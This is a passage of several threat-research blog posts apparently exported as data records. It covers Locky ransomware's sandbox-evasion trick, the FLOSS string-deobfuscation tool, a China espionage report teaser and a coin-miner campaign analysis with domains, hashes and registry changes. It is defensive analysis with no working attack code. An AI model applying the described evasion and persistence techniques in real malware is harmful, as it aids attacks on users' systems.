 <p>6.     Executes the decrypted payload by passing it the command line
  parameter, “123”.</p>
 <h5>
  <b>Locky Payload Updates</b></h5>
 <p>The Locky ransomware downloaded in this campaign requires a command
  line argument to properly execute. This command line parameter, “123”
  in the analyzed sample, is passed to the binary by the first stage
  JavaScript-based downloader. This command line parameter value is used
  in the code unpacking stage of the ransomware. Legitimate binaries
  typically verify the number of arguments passed or compare the command
  line parameter with the expected value and gracefully exit if the
  check fails. However in the case of this Locky ransomware, the program
  does not exit (Figure 6) and the value received as a command line
  parameter is added to a constant value defined in the binary. The sum
  of the constant and the parameter value is used in the decryption
  routine (Figure 7). If no command line parameter is passed, it adds
  zero to the constant.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Locky%20is%20Back%20Joonho%20Sa/Fig6.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6. Command line parameter check</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Locky%20is%20Back%20Joonho%20Sa/Fig7.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 7. Decryption routine</span></p>
 <p>If no command line parameter is passed, then the constant for the
  decryption routine is incorrect. This results in program crash as the
  decrypted code is invalid. In Figure 8 and Figure 9, we can see the
  decrypted code sections with and without the command line parameter, respectively.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Locky%20is%20Back%20Joonho%20Sa/Fig8.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 8. Correct decrypted code</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Locky%20is%20Back%20Joonho%20Sa/Fig9.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 9. Incorrect decrypted code</span></p>
 <p>By using this technique, Locky authors have created a dependency on
  the first stage downloader for the second stage to be executed
  properly. If a second stage payload such as this is directly analyzed,
  it will result in a crash.</p>
 <h5>
  <b>Conclusion</b></h5>
 <p>As of today, the Locky spam campaign is still ongoing, with an added
  anti-analysis / sandbox evasion technique. We expect to see additional
  Locky spam campaigns and will remain vigilant in order to protect our customers.</p>
 <h5>
  <b>Email Hashes</b></h5>
 <p>2cdf62f8aae20026418f143895c769a2009e6b9b3ac59bfa8fc79ca2f326b93a</p>
 <p>1fd5c1f0ecc1d54324f3bdc327e7893032482a13c0914ef6f531bd93caef0a06</p>
 <p>0ea7d59d7f1494fce8f45a1f35abb07a456de6d8d65327eca8ff84f307a49a06</p>
 <p>22645be8553628574a7af3c32a45178e201e9af33b20b36d29b9c012b731da4c</p>
 <p>198d8d1a89221c575d957c1f4342741f3675ebb10f95ffe3371150e124f4850e</p>
 <p> </p>",http://www.fireeye.com/blog/threat-research/2016/06/locky-is-back-and-asking-for-unpaid-debts.html
"Automatically Extracting Obfuscated Strings from Malware using the
FireEye Labs Obfuscated String Solver (FLOSS)","<h4>Introduction and Motivation</h4>
 <p>Have you ever run <span class=""code"">strings.exe</span> on a malware
  executable and its output provided you with IP addresses, file names,
  registry keys, and other indicators of compromise (IOCs)? Great! No
  need to run further analysis or hire expensive experts to determine if
  a file is malicious, its intended usage, and how to find other
  instances. Unfortunately, malware authors have caught on and are
  trying to deter your analysis. Although these authors try to protect
  their executables, we will teach you to use the FireEye Labs
  Obfuscated Strings Solver (FLOSS) to recover sensitive strings from
  malware executables.</p>
 <p>One popular approach malware authors use to protect their software
  is packing. Packing a program transforms the executable into a
  compressed and/or obfuscated form. Packed malware can impede your
  analysis since it requires you to restore the unpacked data first. On
  the other hand, since packing is unusual, simply flagging on packed
  files is a reliable way to identify suspicious executables. Packed
  files can be easily detected via features such as: a small number of
  imported functions, a high entropy level, or suspicious section header
  characteristics. So, while packing hides the strings, it makes a
  malicious binary stick out like a sore thumb.</p>
 <p>Instead, attackers often encode sensitive strings individually
  without packing the entire binary file. This means that during
  runtime, the program decodes the strings prior to use. For example,
  the program may decode the strings unconditionally during the
  initialization routine or decode the strings immediately before their
  use. Either way, the strings are not visible in the on-disk executable
  and the file is not trivial to detect. Listing 1 shows pseudo-code of
  a simple decoding function that decodes obfuscated strings by applying
  a single-byte XOR with a key of 0x15 to each character.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FLOSS%20Moritz/List1.png"" /></p>
 <p>
  <span class=""type-XS"">Listing 1: Simple string obfuscation example
    using the XOR operation</span></p>
 <p>Manually constructing strings is another technique malware authors
  often use to hide strings. Instead of storing a consecutive sequence
  of bytes to form a string, a collection of instructions re-creates the
  strings byte-by-byte. Since strings.exe looks for a sequence of
  printable characters, it is unable to identify the human readable
  string because the characters are interspersed with the opcode data.
  Hiding strings such as file system paths and domain names makes it
  harder for forensic analysts to decide if a file is malicious or not.</p>
 <p>Figure 1 shows a screenshot of IDA Pro illustrating the string
  “goodbye world” being manually constructed on the stack. Although we
  call this technique “stackstrings” it can just as easily be applied to
  global memory or the heap.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FLOSS%20Moritz/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: Manually constructed string on the stack</span></p>
 <h4>Current Methods of Combatting Obfuscated Strings<br /> </h4>
 <p>Reverse engineers have various possibilities when tasked with
  decoding obfuscated strings in malware. Two traditional techniques are
  to use a debugger to recover strings or to reimplement the decoding
  function. Both approaches require analysts to manually identify
  decoding functions first.</p>
 <h5>Using a Debugger</h5>
 <p>After a decoding routine has been identified in a disassembler such
  as IDA Pro, analysts can use a debugger to execute every code path
  that yields a decoded string. They can do this by setting breakpoints
  and manipulating the CPU flags at important spots in the program. When
  the malware decodes a string, analysts dump the region of memory that
  contains this data. This technique uses the malware’s string decoding
  implementation, which must decode strings properly if the malware
  works correctly. However, the debugging steps can be a daunting task
  to perform for every relevant code path. Complex initialization of
  decoding routines and inlined decoding functions further complicate
  this technique.</p>
 <p>Our <a href=""https://github.com/fireeye/flare-dbg/"">flare-dbg
  project</a> can help to automate string decoding using WinDbg, as
  described in the blog post, <a href=""https://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2015/12/flare_script_series.html"" target=""_blank"">FLARE Script Series: Automating Obfuscating String Decoding</a>.</p>
 <h5>Reimplementing Decoding Routines<br /> </h5>
 <p>An alternative static analysis technique is to reimplement the
  decoding routine in a scripting language, such as Python, based on the
  disassembly of the routine. This allows analysts to flexibly apply a
  decoding scheme to all obfuscated strings in a binary at their
  leisure. However, porting code is a tedious and error prone process.
  Additionally, it can be a challenge to extract the obfuscated data.
  For example, if the obfuscated data is manipulated before the decoding
  function initialization then it may be difficult to manually recreate
  the transformations.</p>
 <h5>Recovering Stackstrings</h5>
 <p>Although not challenging, manually recovering stackstrings in IDA
  Pro can be a cumbersome process. The FLARE team provides an <a href=""https://www.fireeye.com/blog/threat-research/2014/08/flare-ida-pro-script-series-automatic-recovery-of-constructed-strings-in-malware.html"">IDA
    Pro plugin</a> that automates the recovery of stackstrings.</p>
 <p>Depending on the actual obfuscation implementation, each recovery
  method can take a considerable amount of time. Unfortunately, malware
  authors can drastically transform an encoding routine with trivial
  changes to the source code. Therefore, analysts have to repeat these
  procedures manually for every single malware sample with obfuscated
  strings. An automated system that extracts these strings would save
  dozens of hours per month for a reverse engineering team such as FLARE.</p>
 <h4>Introducting FLOSS</h4>
 <p>The FireEye Labs Obfuscated String Solver (FLOSS) is an open source
  tool that is released under Apache License 2.0. It automatically
  detects, extracts, and decodes obfuscated strings in Windows Portable
  Executable files. FLOSS is extremely easy to use and works against a
  large corpus of malware. You run it just as you did the <span class=""code"">strings.exe</span> tool. Malware analysts, forensic
  investigators, and incident responders who already look for strings in
  a binary will benefit from FLOSS.</p>
 <p>Figure 2 shows an example output of FLOSS run on a malware with
  obfuscated strings. For this executable the strings output shown in
  Figure 3 does not yield any useful information.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FLOSS%20Moritz/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2: FLOSS example output that provides
    valuable information to analysts</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FLOSS%20Moritz/Fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3: Strings tool output that shows no
    indicators for this executable</span></p>
 <p>For many obfuscated samples, FLOSS’s output offers valuable insight
  into the program’s functionality, whereas the <span class=""code"">strings.exe</span> tool provides no useful information.
  FLOSS extracts higher value strings since strings that are obfuscated
  typically contain the most sensitive configuration resources,
  including command and control server addresses, names of dynamically
  resolved imports, suspicious file paths, and other indicators of
  compromise (IOCs).</p>
 <p>In fact, FLOSS entirely eliminates the need for<span class=""code"">
  strings.exe</span> as FLOSS can also extract all static ASCII and
  UTF-16LE strings from any file. And as we have learned, FLOSS also
  provides deobfuscated strings and recovered stackstrings from PE
  files. This means that there is no real reason to run <span class=""code"">strings.exe</span> anymore.</p>
 <h5>How FLOSS Works</h5>
 <p>FLOSS combines advanced static analysis techniques to automatically
  detect decoding functions and recover obfuscated strings. Here is the
  algorithm in detail:</p>
 <p>
  <b>1.     Analyze program to identify data, code, functions, basic
    blocks, cross-references, etc.</b></p>
 <p>FLOSS uses <a href=""https://github.com/vivisect/vivisect"">vivisect</a> to
  disassemble and analyze the control flow of a program. Vivisect is a
  program analysis library written in pure Python. You can think of it
  like an open-source IDA Pro instance.</p>
 <p>
  <b>2.     Use heuristics to find potential decoding routines.</b></p>
 <p>FLOSS uses plug-ins for defining heuristics. Each heuristic scores
  the likelihood that a function is a decoding routine. This approach
  allows us (and you) to easily extend FLOSS’s identification
  capabilities. The most effective heuristics, which happen to be very
  simple, to date are:</p>
 <ul> <li>Function contains non-zeroing XOR operation</li> <li>There are
    many code cross-references to a function</li> </ul>
 <p>
  <b>3.     Brute-force emulate all code paths among basic blocks and functions.</b></p>
 <p>FLOSS uses vivisect’s CPU and memory modules to emulate x86
  instructions. Each executable is emulated in the Python runtime. The
  goal of this step is to obtain the arguments that get passed into a
  decoding function. FLOSS emulates all code paths in the executable in
  a single-pass, brute-force manner.</p>
 <p>
  <b>4.     Snapshot emulator state (registers and memory) at
    appropriate points.</b></p>
 <p>Whenever FLOSS detects a call to a possible decoding function, it
  takes a snapshot of the memory and register state. This trick allows
  FLOSS to collect all relevant function input without knowing any
  details about the function, e.g., calling convention or the number of arguments.</p>
 <p>
  <b>5.     Emulate decoder functions using emulator state snapshots.</b></p>
 <p>Before FLOSS performs emulation of possible decoding functions, it
  “reverts” to each snapshot it created in the previous step. FLOSS
  emulates each decoding routine with all collected emulator state
  snapshots. The emulation stops once the routine returns, or until
  10,000 instructions have been emulated, which avoids infinite loops
  during program emulation. This allows FLOSS to identify changes to the
  CPU and memory states introduced by the decoding routines.</p>
 <p>
  <b>6.     Compare memory state from before and after function emulation.</b></p>
 <p>FLOSS compares the emulator memory segments before and after
  emulating a decoding function. This results in a list of byte
  sequences with differing content. If a decoding routine exposed some
  data, the deobfuscated data must be found within these byte sequences.</p>
 <p>
  <b>7.     Extract human-readable strings from memory state difference.</b></p>
 <p>For each differing byte sequence, FLOSS extracts all human readable
  strings in ASCII and UTF-16LE format. This is what it displays to the user.</p>
 <h5>Installation</h5>
 <p>We provide standalone executable files of FLOSS for Windows and
  Linux at <a href=""https://github.com/fireeye/flare-floss/releases"">https://github.com/fireeye/flare-floss/releases</a>.
  The tool is written in pure Python and the source code is available on
  GitHub at <a href=""https://github.com/fireeye/flare-floss"">https://github.com/fireeye/flare-floss</a>.</p>
 <p>You can also install FLOSS via the standard Python package installer
    <span class=""code"">pip</span>. This will add an executable <span class=""code"">floss.exe</span> (on Windows) or <span class=""code"">floss</span> (on Linux) to your $PATH. As a third option,
  you can install FLOSS from source. Please see the GitHub page for the
  most up to date <a href=""https://github.com/fireeye/flare-floss/blob/master/doc/installation.md"">installation instructions</a>.</p>
 <h5>Usage</h5>
 <p>To extract static ASCII and UTF-16LE strings, obfuscated strings,
  and stackstrings from an executable file, run:</p>
 <p>
  <span class=""code"">$ floss.exe /path/to/binary</span></p>
 <p>If you want to exclude static strings from FLOSS’s output provide
    the<span class=""code""> –-no-static-strings</span> switch:</p>
 <p>
  <span class=""code"">$ floss.exe –-no-static-strings /path/to/binary</span></p>
 <p>You can suppress FLOSS’s headers and formatting output with the<span class=""code""> -q </span>switch. This mode is appropriate for piping
  to grep or other tools:</p>
 <p>
  <span class=""code"">$ floss.exe –q /path/to/binary</span></p>
 <p>To display only strings with a minimum length use the <span class=""code"">-n</span> switch. The default minimum string length is four:</p>
 <p>
  <span class=""code"">$ floss.exe –n 8 /path/to/binary</span></p>
 <p>If you know a decoding function offset (or have a list of
  comma-separated function offsets), you can instruct FLOSS to only
  analyze the provided functions using the<span class=""code""> -f </span>switch:</p>
 <p>
  <span class=""code"">$ floss.exe /path/to/binary -f 0xF005BA11</span></p>
 <p>
  <span class=""code"">$ floss.exe /path/to/binary -f 0xF005BA11,0xF00B005E</span></p>
 <p>Use the <span class=""code"">-i </span>switch to create an IDAPython
  script that annotates an IDA Pro IDB database with the decoded strings:</p>
 <p>
  <span class=""code"">$ floss.exe -i SCRIPTOUTPUTPATH /path/to/binary</span></p>
 <p>FLOSS can also create radare2 scripts via the<span class=""code""> –r </span>switch:</p>
 <p>
  <span class=""code"">$ floss.exe -r SCRIPTOUTPUTPATH /path/to/binary</span></p>
 <p>The <span class=""code"">-h</span> switch displays the entire help for
  all of FLOSS’s functionality:</p>
 <p>
  <span class=""code"">$ floss.exe -h</span></p>
 <h4>Summary</h4>
 <p>In this blog post we have introduced the FLARE team’s newest
  contribution to the malware analysis community. FLOSS is an
  open-source tool to automatically detect, extract, and decode
  obfuscated strings in Windows Portable Executable files. The community
  needs this type of tool to fight back against malware authors who
  commonly obfuscate strings in their programs to deter static and
  dynamic analysis. In addition to extracting strings that are
  deobfuscated by decoding routines, FLOSS can recover stackstrings and
  obtain all static strings.</p>
 <p>Try out FLOSS in your next malware analysis. The tool is extremely
  easy to use and can provide valuable information for forensic
  analysts, incident responders, and reverse engineers. If you enjoy the
  tool, run into issues using it, or have any other comments, please
  contact us via the projects GitHub page at <a href=""https://github.com/fireeye/flare-floss/"">https://github.com/fireeye/flare-floss/.</a></p>",http://www.fireeye.com/blog/threat-research/2016/06/automatically-extracting-obfuscated-strings.html
Red Line Drawn: China Recalculates Its Use of Cyber Espionage,"<p>
  <img class=""float-left"" src=""https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/rpt-china-espionage-thumb.jpg"" />On
  Sept. 25, 2015, President Barack Obama and Chinese President Xi
  Jinping agreed that neither government would “<a href=""https://www.whitehouse.gov/the-press-office/2015/09/25/fact-sheet-president-xi-jinpings-state-visit-united-states"">conduct
    or knowingly support cyber-enabled theft of intellectual
  property</a>” for an economic advantage. Some observers hailed the
  agreement as a game changer for U.S. and Chinese relations, while
  skeptics saw this as little more than a diplomatic formality unlikely
  to stymie years of <a href=""http://www.cnn.com/2015/09/25/politics/us-china-cyber-theft-hack/"">state-sponsored</a>
    <a href=""https://freedomhouse.org/blog/obama-xi-agreement-will-not-resolve-china-cybersecurity-threat"">intellectual
    property theft</a>.<a name=""FootnoteMarker1-0""></a> Since the
  agreement, there has been much discussion and speculation as to what
  impact, if any, it would have on Chinese cyber operations.</p>
 <p>To investigate this question, FireEye iSIGHT Intelligence reviewed
  the activity of 72 groups that we suspect are operating in China or
  otherwise supporting Chinese state interests. Going back nearly three
  and a half years to early 2013, our analysis paints a complex picture,
  leading us to assess that a range of political, economic, and other
  forces were contributing to a shift in Chinese cyber operations more
  than a year prior to the Xi-Obama agreement.</p>
 <p>Between September 2015 and June 2016, we observed 13 active
  China-based groups conduct multiple instances of network compromise
  against corporations in the U.S., Europe, and Japan. During this same
  timeframe, other China-based groups targeted organizations in Russia
  and the Asia Pacific region. However, since mid-2014, we have observed
  an overall decrease in successful network compromises by China-based
  groups against organizations in the U.S. and 25 other countries. These
  shifts have coincided with ongoing political and military reforms in
  China, widespread exposure of Chinese cyber activity, and
  unprecedented action by the U.S. government.</p>
 <p>Download the report, <i>
    <a href=""https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/rpt-china-espionage.pdf"" target=""_blank"">Red Line Drawn: China Recalculates Its Use of
      Cyber Espionage</a></i>.</p>",http://www.fireeye.com/blog/threat-research/2016/06/red-line-drawn-china-espionage.html
Resurrection of the Evil Miner,"<p>At FireEye Labs, we recently detected the resurgence of a coin mining
  campaign with a novel and unconventional infection vector in the form
  of an iFRAME (inline frame) – an HTML document embedded inside another
  HTML document on a web page that allows users to get content from
  another separate source and display it within the main web page
  – embedded in a PE binary (Portable Executable Binary, or .exe).</p>
 <p>We observed an anomaly when approximately 60 domains (all [.]top
  TLDs  registered on April 7, 2016) started serving a coin mining
  malware – to mine BitMonero, a form of digital currency – on their
  main page under the mime-type of html/text. All of these domains were
  registered by the same entity and they were resolving to the same IP.  </p>
 <p>Only the PE binary file was directly hosted on the index page
  without any browser exploit (in general, browser exploits are
  delivered via third party software exploits such as JavaScript or
  Flash). However, an HTML IFRAME tag that was embedded inside the
  malware binary was being used to force the web browser to download its
  copy as a file named “Photo.scr”. This filename is perhaps designed to
  entice the human victim to click on the file and check the “Photo”
  that was downloaded.   </p>
 <p>In the absence of a browser exploit mechanism, this appears to be a
  social engineering attack, where the attacker would trick a user into
  downloading and executing the binary hosted on this site. The page
  contents were downloaded and analyzed by FireEye team members. The SCR
  file had a md5sum: aba2d86ed17f587eb6d57e6c75f64f05.<b> </b>Our system
  classified this as a coinminer malware, which uses its victim’s
  computing resources to mine bitcoins.</p>
 <h4>What is a Bitcoin and BitMonero and how is it created?</h4>
 <p>Bitcoin and BitMonero are digital currencies that leverage a
  peer-to-peer (P2P) decentralized model for validating and
  transactions. Since no financial institutions are used, no central
  authority is necessary to control this currency. Bitcoins are accepted
  as currency by many merchants, can be used to pay for various online
  services, products and goods, and can be traded for traditional
  currency via Bitcoin/currency exchanges. Bitcoins are generated or
  “mined” after processing a “block” of data. A Bitcoin or BitMonero
  block is a cryptographic challenge that is solved by intensive
  computing power.</p>
 <h4>Domains list serving the content</h4>
 <p>These 55 domains (tabulated in Table 1) associated with BitMonero
  mining operations were registered on the same day and serving the same
  content. These domains belonged to the <i>[.]top</i> TLD.</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0"" width=""443""> <tbody>
    <tr>
      <td valign=""bottom"" width=""72""><p>mlwhv[.]top</p> </td> <td valign=""bottom"" width=""74""><p>uogwq[.]top</p> </td> <td valign=""bottom"" width=""74""><p>ggkuu[.]top</p> </td> <td valign=""bottom"" width=""74""><p>yccwf[.]top</p> </td> <td valign=""bottom"" width=""74""><p>psilh[.]top</p> </td> <td valign=""bottom"" width=""74""><p>eadlr[.]top</p> </td> </tr>
    <tr>
      <td valign=""bottom"" width=""72""><p>ngdhi[.]top</p> </td> <td valign=""bottom"" width=""74""><p>yhens[.]top</p> </td> <td valign=""bottom"" width=""74""><p>eyxvm[.]top</p> </td> <td valign=""bottom"" width=""74""><p>jdjkc[.]top</p> </td> <td valign=""bottom"" width=""74""><p>uprhr[.]top</p> </td> <td valign=""bottom"" width=""74""><p>zylhq[.]top</p> </td> </tr>
    <tr>
      <td valign=""bottom"" width=""72""><p>voxzn[.]top</p> </td> <td valign=""bottom"" width=""74""><p>yuaek[.]top</p> </td> <td valign=""bottom"" width=""74""><p>ncasy[.]top</p> </td> <td valign=""bottom"" width=""74""><p>wikxu[.]top</p> </td> <td valign=""bottom"" width=""74""><p>mfxaw[.]top</p> </td> <td valign=""bottom"" width=""74""><p>lwwlg[.]top</p> </td> </tr>
    <tr>
      <td valign=""bottom"" width=""72""><p>fkfrl[.]top</p> </td> <td valign=""bottom"" width=""74""><p>lbnvy[.]top</p> </td> <td valign=""bottom"" width=""74""><p>ejqpw[.]top</p> </td> <td valign=""bottom"" width=""74""><p>xvrqo[.]top</p> </td> <td valign=""bottom"" width=""74""><p>ofmio[.]top</p> </td> <td valign=""bottom"" width=""74""><p>pealp[.]top</p> </td> </tr>
    <tr>
      <td valign=""bottom"" width=""72""><p>spvok[.]top</p> </td> <td valign=""bottom"" width=""74""><p>xrjsa[.]top</p> </td> <td valign=""bottom"" width=""74""><p>buacs[.]top</p> </td> <td valign=""bottom"" width=""74""><p>apbqd[.]top</p> </td> <td valign=""bottom"" width=""74""><p>zknhb[.]top</p> </td> <td valign=""bottom"" width=""74""><p>mdbfj[.]top</p> </td> </tr>
    <tr>
      <td valign=""bottom"" width=""72""><p>vkrov[.]top</p> </td> <td valign=""bottom"" width=""74""><p>wafpp[.]top</p> </td> <td valign=""bottom"" width=""74""><p>trwrx[.]top</p> </td> <td valign=""bottom"" width=""74""><p>bnxom[.]top</p> </td> <td valign=""bottom"" width=""74""><p>mdqlo[.]top</p> </td> <td valign=""bottom"" width=""74""><p>qilwl[.]top</p> </td> </tr>
    <tr>
      <td valign=""bottom"" width=""72""><p>yuhoa[.]top</p> </td> <td valign=""bottom"" width=""74""><p>fbldk[.]top</p> </td> <td valign=""bottom"" width=""74""><p>quiwq[.]top</p> </td> <td valign=""bottom"" width=""74""><p>wvrwv[.]top</p> </td> <td valign=""bottom"" width=""74""><p>osjjo[.]top</p> </td> <td valign=""bottom"" width=""74""><p>wisit[.]top</p> </td> </tr>
    <tr>
      <td valign=""bottom"" width=""72""><p>ejaiy[.]top</p> </td> <td valign=""bottom"" width=""74""><p>ewnoh[.]top</p> </td> <td valign=""bottom"" width=""74""><p>hitaz[.]top</p> </td> <td valign=""bottom"" width=""74""><p>bveat[.]top</p> </td> <td valign=""bottom"" width=""74""><p>vjrye[.]top</p> </td> <td valign=""bottom"" width=""74""><p>vjeyu[.]top</p> </td> </tr>
    <tr>
      <td valign=""bottom"" width=""72""><p>szbia[.]top</p> </td> <td valign=""bottom"" width=""74""><p>wniyz[.]top</p> </td> <td valign=""bottom"" width=""74""><p>dduni[.]top</p> </td> <td valign=""bottom"" width=""74""><p>iffis[.]top</p> </td> <td valign=""bottom"" width=""74""><p>wejyr[.]top</p> </td> <td valign=""bottom"" width=""74""><p>ppymk[.]top</p> </td> </tr>
    <tr>
      <td valign=""bottom"" width=""72""><p>ndyqr[.]top</p> </td> <td valign=""bottom"" width=""74""><p> </p> </td> <td valign=""bottom"" width=""74""><p> </p> </td> <td valign=""bottom"" width=""74""><p> </p> </td> <td valign=""bottom"" width=""74""><p> </p> </td> <td valign=""bottom"" width=""74""><p> </p> </td> </tr></tbody></table>
 <p>
  <span class=""type-XS"">Table 1: List of 55 registered domains for
    Bitcoin mining</span></p>
 <h5>IP and Whois Information</h5>
 <p>IP and whois registration information for all these domains contains
  the same registrant and these domains resolved to the same IP address
  as of April 20, 2016. The addresses were determined to belong to a
  single service provider located in North Kansas City, USA. The
  registrant whois information shown in the following table specifies an
  address in NanJing, China. This information is consistent for the
  domains registered for this campaign:</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0"" width=""546""> <tbody>
    <tr>
      <td valign=""bottom"" width=""42""><p>
          <b>domain</b></p> </td> <td valign=""bottom"" width=""56""><p>
          <b>date created</b></p> </td> <td valign=""bottom"" width=""128""><p>
          <b>registrant email</b></p> </td> <td valign=""bottom"" width=""146""><p>
          <b>Registrant address</b></p> </td> <td valign=""bottom"" width=""105""><p>
          <b>registrar name</b></p> </td> <td valign=""bottom"" width=""70""><p>
          <b>IP address</b></p> </td> </tr>
    <tr>
      <td valign=""bottom"" width=""42""><p>ggkuu[.]top</p> </td> <td valign=""bottom"" width=""56""><p>4/7/2016</p> </td> <td valign=""bottom"" width=""128""><p>yaomaiyumingzhaowo@126.com</p> </td> <td valign=""bottom"" width=""146""><p>QingShuiTingDongLu163HaoHengDaLvZhouHuaYuan,
        NanJing</p> </td> <td valign=""bottom"" width=""105""><p>Jiangsu
          bangning science technology Co</p> </td> <td valign=""bottom"" width=""70""><p>198.204.254[.]82</p> </td> </tr></tbody></table>
 <h4>Web Content Analysis</h4>
 <p>These domains were pointing to the IP: 198.204.254[.]82. The server
  was configured to respond with the same content to any GET request for
  these domains. An analysis of one of the domains is presented in this
  post as a case study.</p>
 <p>For this case study we chose a representative domain, “ggkuu[.]top”,
  from the list. Browsing to the site http://www.ggkuu[.]top with a user
  web browser results in the malware being loaded as an html/text
  MIME-type object.</p>
 <p>Figure 1 shows a screenshot of the web browser after visiting the
  site. Because the Mime-type is set to html/text, the binary appears as
  html/text in the browser. Note the <i>MZ header</i> at the beginning
  of the page. MZ headers are associated with executable binaries. This
  appears to be a benign looking file to the end-user; however, it is
  treated by the end-user system as an executable.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Evil%20Miner/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1. www.Ggkuu[.]top content view in browser</span></p>
 <p>The following is a session generated using the WGET utility, a
  command line tool that can be used to generate web requests, which
  verifies that the site serves the malware as mime-type of text/html.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Evil%20Miner/Tab2.png"" /></p>
 <h5>Malware Delivery/Exploit method</h5>
 <p>The malware is delivered by way of a standard 1x1 iFRAME that will
  attempt to load the binary file, “Photo.SCR” upon visiting the
  website. The following is the iframe:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Evil%20Miner/Tab3.png"" /></p>
 <p>The binary object was obtained and is identical to “Photo.scr” based
  on the file MD5 hashsum, also shown in Figure 2.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Evil%20Miner/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2. www.Ggkuu[.]top the iframe embedded in
    the content triggering Photo.scr download in the web browser</span></p>
 <h4>A Historical Footprint</h4>
 <p>We observed that the original binary file (Photo.scr) is primarily a
  container (with some additional features discussed later) for known
  malware binary <b>
    <i>NSCpuCNMiner32.exe</i></b> with the MD5 hash
  <b>3afeb8e9af02a33ff71bf2f6751cae3a</b>, a binary we first saw in the
  wild in July 2014. The binary is packed with PolyEnE 0.01+.</p>
 <p>Traditionally, the malware has been propagated using social
  engineering through <a href=""http://www.cyberoam.com/blog/bitcoin-mining-malware-a-new-rapidly-spreading-variant-3/"">Skype,
    email, removable media</a> and by using phishing campaigns; where it
  has masqueraded as a legitimate application. During this campaign we
  have observed that NSCpuCNMiner32.exe is deployed after a victim
  visits one of the 55 malicious websites described previously, as a
  result of loading “photo.scr”.    </p>
 <h4>Execution &amp; Dynamic Analysis</h4>
 <p>The binary file “photo.scr” requires no special arguments, executing
  on Windows and WINE-enabled systems through traditional user
  interaction such as double-clicking.</p>
 <h5>Configurational Settings<b></b></h5>
 <p>As soon as the executable is launched, the following changes to the
  host operating system are performed. </p>
 <p>The following mutex is created:</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0"" width=""554""> <tbody>
    <tr>
      <td valign=""top"" width=""554""><p>\BaseNamedObjects\gcc-shmem-tdm2-use_fc_key<br />
          \BaseNamedObjects\gcc-shmem-tdm2-sjlj_once<br />
          \BaseNamedObjects\gcc-shmem-tdm2-once_global_shmem<br />
          \BaseNamedObjects\gcc-shmem-tdm2-once_obj_shmem<br />
          \BaseNamedObjects\gcc-shmem-tdm2-mutex_global_shmem<br />
          \BaseNamedObjects\gcc-shmem-tdm2-_pthread_tls_once_shmem<br />
          \BaseNamedObjects\gcc-shmem-tdm2-_pthread_tls_shmem<br />
          \BaseNamedObjects\gcc-shmem-tdm2-mtx_pthr_locked_shmem<br />
          \BaseNamedObjects\gcc-shmem-tdm2-mutex_global_static_shmem<br />
          \BaseNamedObjects\gcc-shmem-tdm2-mxattr_recursive_shmem<br />
          \BaseNamedObjects\gcc-shmem-tdm2-pthr_root_shmem<br />
          \BaseNamedObjects\gcc-shmem-tdm2-idListCnt_shmem<br />
          \BaseNamedObjects\gcc-shmem-tdm2-idListMax_shmem<br />
          \BaseNamedObjects\gcc-shmem-tdm2-idList_shmem<br />
          \BaseNamedObjects\gcc-shmem-tdm2-idListNextId_shmem<br />
          \BaseNamedObjects\gcc-shmem-tdm2-fc_key<br />
          \BaseNamedObjects\gcc-shmem-tdm2-_pthread_key_lock_shmem<br />
          \BaseNamedObjects\gcc-shmem-tdm2-_pthread_cancelling_shmem<br />
          \BaseNamedObjects\gcc-shmem-tdm2-cond_locked_shmem_rwlock<br />
        \BaseNamedObjects\gcc-shmem-tdm2-rwl_global_shmem</p> </td> </tr></tbody></table>
 <p>The following registry key is modified:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Evil%20Miner/Tab5.png"" /></p>
 <p>Within the registry path for Internet Settings, the following web
  proxy settings are modified or deleted:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Evil%20Miner/Tab6.png"" /></p>
 <p>The malware reconfigures caching of web content:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Evil%20Miner/Tab7.png"" /></p>
 <p>The malware then disables the security settings of Internet Explorer
  by modifying the following registry keys:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Evil%20Miner/Tab8.png"" /></p>
 <p>Next, the malware modifies global file extension settings for the
  infected system to prevent showing the user file extensions via the
  Windows Explorer.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Evil%20Miner/Tab9.png"" /></p>
 <p>Then it attempts to access potentially sensitive information from
  local browsers:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Evil%20Miner/Tab10.png"" /></p>
 <p>It also adds itself to the autorun registry keypath for persistence.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Evil%20Miner/Tab11.png"" /></p>
